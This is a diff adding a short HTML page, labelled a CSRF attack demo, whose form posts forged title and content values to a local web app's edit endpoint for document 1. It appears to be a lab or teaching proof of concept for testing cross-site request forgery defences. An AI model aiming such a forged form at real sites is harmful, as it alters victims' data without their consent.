@@ -1,0 +1,20 @@
+<!doctype html>
+<html>
+<body>
+    <h2>CSRF Edit Attack Demo</h2>
+    <p> Tries to edit the document with ID 1. </p>
+    <form method="POST" action="http://127.0.0.1:8000/edit/1/">
+        <div class="form-group">
+            <label for="title">Title:</label><br>
+            <input type="text" name="title" value="CSRFed title" maxlength="100" required="" id="id_title">
+        </div>
+
+        <div class="form-group">
+            <label for="content">Content:</label><br>
+            <textarea name="content" cols="40" rows="10" required="" id="id_content">Edited via CSRF demo</textarea>
+        </div>
+
+        <button type="submit" class="btn-primary">Post</button>
+    </form>
+</body>
+</html>
